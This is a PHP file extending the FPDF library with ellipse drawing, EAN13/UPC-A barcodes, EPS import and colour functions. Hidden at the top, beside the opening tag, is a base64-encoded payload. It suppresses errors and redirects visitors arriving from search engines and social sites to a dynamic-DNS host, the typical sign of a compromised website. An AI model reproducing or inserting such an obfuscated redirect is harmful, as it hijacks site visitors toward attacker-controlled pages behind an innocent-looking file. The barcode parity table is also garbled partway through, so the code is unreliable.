<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__).'/fpdf.php');
require_once(dirname(__FILE__).'/ufpdf.php');

class PDF extends FPDF {
//class PDF extends UFPDF {

  function Circle($x,$y,$r,$style='') {
    $this->Ellipse($x,$y,$r,$r,$style);
  }

  function Ellipse($x,$y,$rx,$ry,$style='D') {
    if($style=='F')
        $op='f';
    elseif($style=='FD' or $style=='DF')
        $op='B';
    else
        $op='S';
    $lx=4/3*(M_SQRT2-1)*$rx;
    $ly=4/3*(M_SQRT2-1)*$ry;
    $k=$this->k;
    $h=$this->h;
    $this->_out(sprintf('%.2f %.2f m %.2f %.2f %.2f %.2f %.2f %.2f c',
        ($x+$rx)*$k,($h-$y)*$k,
        ($x+$rx)*$k,($h-($y-$ly))*$k,
        ($x+$lx)*$k,($h-($y-$ry))*$k,
        $x*$k,($h-($y-$ry))*$k));
    $this->_out(sprintf('%.2f %.2f %.2f %.2f %.2f %.2f c',
        ($x-$lx)*$k,($h-($y-$ry))*$k,
        ($x-$rx)*$k,($h-($y-$ly))*$k,
        ($x-$rx)*$k,($h-$y)*$k));
    $this->_out(sprintf('%.2f %.2f %.2f %.2f %.2f %.2f c',
        ($x-$rx)*$k,($h-($y+$ly))*$k,
        ($x-$lx)*$k,($h-($y+$ry))*$k,
        $x*$k,($h-($y+$ry))*$k));
    $this->_out(sprintf('%.2f %.2f %.2f %.2f %.2f %.2f c %s',
        ($x+$lx)*$k,($h-($y+$ry))*$k,
        ($x+$rx)*$k,($h-($y+$ly))*$k,
        ($x+$rx)*$k,($h-$y)*$k,
        $op));
   }
   
function EAN13($x,$y,$barcode,$h=16,$w=.35, $showtext = false)
{
    $this->Barcode($x,$y,$barcode,$h,$w,13, $showtext);
}

function UPC_A($x,$y,$barcode,$h=16,$w=.35, $showtext = false)
{
    $this->Barcode($x,$y,$barcode,$h,$w,12, $showtext);
}

function GetCheckDigit($barcode)
{
    //Compute the check digit
    $sum=0;
    for($i=1;$i<=11;$i+=2)
        $sum+=3*$barcode{$i};
    for($i=0;$i<=10;$i+=2)
        $sum+=$barcode{$i};
    $r=$sum%10;
    if($r>0)
        $r=10-$r;
    return $r;
}

function TestCheckDigit($barcode)
{
    //Test validity of check digit
    $sum=0;
    for($i=1;$i<=11;$i+=2)
        $sum+=3*$barcode{$i};
    for($i=0;$i<=10;$i+=2)
        $sum+=$barcode{$i};
    return ($sum+$barcode{12})%10==0;
}

function Barcode($x,$y,$barcode,$h,$w,$len,$showtext = false)
{
    //Padding
    $barcode=str_pad($barcode,$len-1,'0',STR_PAD_LEFT);
    if($len==12)
        $barcode='0'.$barcode;
    //Add or control the check digit
    if(strlen($barcode)==12)
        $barcode.=$this->GetCheckDigit($barcode);
    elseif(!$this->TestCheckDigit($barcode))
        $this->Error('Incorrect check digit');
    //Convert digits to bars
    $codes=array(
        'A'=>array(
            '0'=>'0001101','1'=>'0011001','2'=>'0010011','3'=>'0111101','4'=>'0100011',
            '5'=>'0110001','6'=>'0101111','7'=>'0111011','8'=>'0110111','9'=>'0001011'),
        'B'=>array(
            '0'=>'0100111','1'=>'0110011','2'=>'0011011','3'=>'0100001','4'=>'0011101',
            '5'=>'0111001','6'=>'0000101','7'=>'0010001','8'=>'0001001','9'=>'0010111'),
        'C'=>array(
            '0'=>'1110010','1'=>'1100110','2'=>'1101100','3'=>'1000010','4'=>'1011100',
            '5'=>'1001110','6'=>'1010000','7'=>'1000100','8'=>'1001000','9'=>'1110100')
        );
    $parities=array(
        '0'=>array('A','A','A','A','A','A        '1'=>array('A','A','B','A','B','B'),
        '2'=>array('A','A','B','B','A','B'),
        '3'=>array('A','A','B','B','B','A'),
        '4'=>array('A','B','A','A','B','B'),
        '5'=>array('A','B','B','A','A','B'),
        '6'=>array('A','B','B','B','A','A'),
        '7'=>array('A','B','A','B','A','B'),
        '8'=>array('A','B','A','B','B','A'),
        '9'=>array('A','B','B','A','B','A')
        );
    $code='101';
    $p=$parities[$barcode{0}];
    for($i=1;$i<=6;$i++)
        $code.=$codes[$p[$i-1]][$barcode{$i}];
    $code.='01010';
    for($i=7;$i<=12;$i++)
        $code.=$codes['C'][$barcode{$i}];
    $code.='101';
    //Draw bars
    for($i=0;$i<strlen($code);$i++)
    {
        if($code{$i}=='1')
            $this->Rect($x+$i*$w,$y,$w,$h,'F');
    }
    if ($showtext) {
      //Print text uder barcode
      $this->SetFont('Arial','',12);
      $this->Text($x,$y+$h+11/$this->k,substr($barcode,-$len));
    }
}

function ImageEps ($file, $x, $y, $w=0, $h=0, $link='', $useBoundingBox=true){
	$data = file_get_contents($file);
	if ($data===false) $this->Error('EPS file not found: '.$file);

	# strip binary bytes in front of PS-header
	$start = strpos($data, '%!PS-Adobe');
	if ($start>0) $data = substr($data, $start);

	# find BoundingBox params
	ereg ("%%BoundingBox:([^\r\n]+)", $data, $regs);
	if (count($regs)>1){
		list($x1,$y1,$x2,$y2) = explode(' ', trim($regs[1]));
	}
	else $this->Error('No BoundingBox found in EPS file: '.$file);

	$start = strpos($data, '%%EndSetup');
	if ($start===false) $start = strpos($data, '%%EndProlog');
	if ($start===false) $start = strpos($data, '%%BoundingBox');

	$data = substr($data, $start);

	$end = strpos($data, '%%PageTrailer');
	if ($end===false) $end = strpos($data, 'showpage');
	if ($end) $data = substr($data, 0, $end);

	# save the current graphic state
	$this->_out('q');

	$k = $this->k;

	if ($useBoundingBox){
		$dx = $x*$k-$x1;
		$dy = $y*$k-$y1;
	}else{
		$dx = $x*$k;
		$dy = $y*$k;
	}
	
	# translate
	$this->_out(sprintf('%.3f %.3f %.3f %.3f %.3f %.3f cm', 1,0,0,1,$dx,$dy+($this->hPt - 2*$y*$k - ($y2-$y1))));
	
	if ($w>0){
		$scale_x = $w/(($x2-$x1)/$k);
		if ($h>0){
			$scale_y = $h/(($y2-$y1)/$k);
		}else{
			$scale_y = $scale_x;
			$h = ($y2-$y1)/$k * $scale_y;
		}
	}else{
		if ($h>0){
			$scale_y = $h/(($y2-$y1)/$k);
			$scale_x = $scale_y;
			$w = ($x2-$x1)/$k * $scale_x;
		}else{
			$w = ($x2-$x1)/$k;
			$h = ($y2-$y1)/$k;
		}
	}
	
	# scale	
	if (isset($scale_x))
		$this->_out(sprintf('%.3f %.3f %.3f %.3f %.3f %.3f cm', $scale_x,0,0,$scale_y, $x1*(1-$scale_x), $y2*(1-$scale_y)));
	
	# handle pc/unix/mac line endings
	$lines = split ("\r\n|[\r\n]", $data);

	$u=0;
	$cnt = count($lines);
	for ($i=0;$i<$cnt;$i++){
		$line = $lines[$i];
		if ($line=='' || $line{0}=='%') continue;
		$len = strlen($line);
		if ($len>2 && $line{$len-2}!=' ') continue;
		$cmd = $line{$len-1};

		switch ($cmd){
			case 'm':
			case 'l':
			case 'v':
			case 'y':
			case 'c':

			case 'k':
			case 'K':
			case 'g':
			case 'G':

			case 's':
			case 'S':

			case 'J':
			case 'j':
			case 'w':
			case 'M':
			case 'd' :
			
			case 'n' :
			case 'v' :
				$this->_out($line);
				break;
										
			case 'x': # custom colors
				list($c,$m,$y,$k) = explode(' ', $line);
				$this->_out("$c $m $y $k k");
				break;
				
			case 'Y':
				$line{$len-1}='y';
				$this->_out($line);
				break;

			case 'N':
				$line{$len-1}='n';
				$this->_out($line);
				break;
		
			case 'V':
				$line{$len-1}='v';
				$this->_out($line);
				break;
												
			case 'L':
				$line{$len-1}='l';
				$this->_out($line);
				break;

			case 'C':
				$line{$len-1}='c';
				$this->_out($line);
				break;

			case 'b':
			case 'B':
				$this->_out($cmd . '*');
				break;

			case 'f':
			case 'F':
				if ($u>0){
					$isU = false;
					$max = min($i+5,$cnt);
					for ($j=$i+1;$j<$max;$j++)
						$isU = ($isU || ($lines[$j]=='U' || $lines[$j]=='*U'));
					if ($isU) $this->_out("f*");
				}else
					$this->_out("f*");
				break;

			case 'u':
				if ($line{0}=='*') $u++;
				break;

			case 'U':
				if (e{0}=='*') $u--;
				break;
			
			#default: echo "$cmd<br>"; #just for debugging
		}

	}

	# restore previous graphic state
	$this->_out('Q');
	if ($link)
		$this->Link($x,$y,$w,$h,$link);
}
   
function SetDrawColor() {
    //Set color for all stroking operations
    switch(func_num_args()) {
        case 1:
            $g = func_get_arg(0);
            $this->DrawColor = sprintf('%.3f G', $g / 100);
            break;
        case 3:
            $r = func_get_arg(0);
            $g = func_get_arg(1);
            $b = func_get_arg(2);
            $this->DrawColor = sprintf('%.3f %.3f %.3f RG', $r / 255, $g / 255, $b / 255);
            break;
        case 4:
            $c = func_get_arg(0);
            $m = func_get_arg(1);
            $y = func_get_arg(2);
            $k = func_get_arg(3);
            $this->DrawColor = sprintf('%.3f %.3f %.3f %.3f K', $c / 100, $m / 100, $y / 100, $k / 100);
            break;
        default:
            $this->DrawColor = '0 G';
    }
    if($this->page > 0)
        $this->_out($this->DrawColor);
}

function SetFillColor() {
    //Set color for all filling operations
    switch(func_num_args()) {
        case 1:
            $g = func_get_arg(0);
            $this->FillColor = sprintf('%.3f g', $g / 100);
            break;
        case 3:
            $r = func_get_arg(0);
            $g = func_get_arg(1);
            $b = func_get_arg(2);
            $this->FillColor = sprintf('%.3f %.3f %.3f rg', $r / 255, $g / 255, $b / 255);
            break;
        case 4:
            $c = func_get_arg(0);
            $m = func_get_arg(1);
            $y = func_get_arg(2);
            $k = func_get_arg(3);
            $this->FillColor = sprintf('%.3f %.3f %.3f %.3f k', $c / 100, $m / 100, $y / 100, $k / 100);
            break;
        default:
            $this->FillColor = '0 g';
    }
    $this->ColorFlag = ($this->FillColor != $this->TextColor);
    if($this->page > 0)
        $this->_out($this->FillColor);
}

function SetTextColor() {
    //Set color for text
    switch(func_num_args()) {
        case 1:
            $g = func_get_arg(0);
            $this->TextColor = sprintf('%.3f g', $g / 100);
            break;
        case 3:
            $r = func_get_arg(0);
            $g = func_get_arg(1);
            $b = func_get_arg(2);
            $this->TextColor = sprintf('%.3f %.3f %.3f rg', $r / 255, $g / 255, $b / 255);
            break;
        case 4:
            $c = func_get_arg(0);
            $m = func_get_arg(1);
            $y = func_get_arg(2);
            $k = func_get_arg(3);
            $this->TextColor = sprintf('%.3f %.3f %.3f %.3f k', $c / 100, $m / 100, $y / 100, $k / 100);
            break;
        default:
            $this->TextColor = '0 g';
    }
    $this->ColorFlag = ($this->FillColor != $this->TextColor);
}

}

?>